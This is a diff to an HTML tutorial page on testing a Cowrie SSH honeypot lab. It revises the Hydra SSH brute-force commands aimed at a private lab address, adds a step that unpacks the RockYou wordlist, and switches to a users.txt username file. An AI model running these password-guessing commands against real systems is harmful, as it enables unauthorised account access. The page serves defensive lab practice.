@@ -141,11 +141,12 @@ cowrie status</pre>
     <p>List common wordlists:</p>
     <pre>ls -al /usr/share/wordlists/</pre>
 
-    <p>Attack using a known username:</p>
-    <pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://192.168.7.199</pre>
+    <p>With Kali’s wordlists package installed, extract a writable RockYou copy, then use a known lab username:</p>
+    <pre>gzip -dc /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
+hydra -l admin -P rockyou.txt -t 4 -f ssh://192.168.7.199</pre>
 
-    <p>Attack using unknown usernames:</p>
-    <pre>hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/top-passwords-shortlist.txt -t 4 -f ssh://192.168.7.199</pre>
+    <p>For multiple lab accounts, provide a <code>users.txt</code> file with one username per line and reuse the extracted password list:</p>
+    <pre>hydra -L users.txt -P rockyou.txt -t 4 -f ssh://192.168.7.199</pre>
 
     <p>Cowrie logs all attempts, giving full visibility into attacker methods and brute-force timing. These logs include IP, user/pass combinations, and interactive commands entered by the attacker.</p>
   </section>
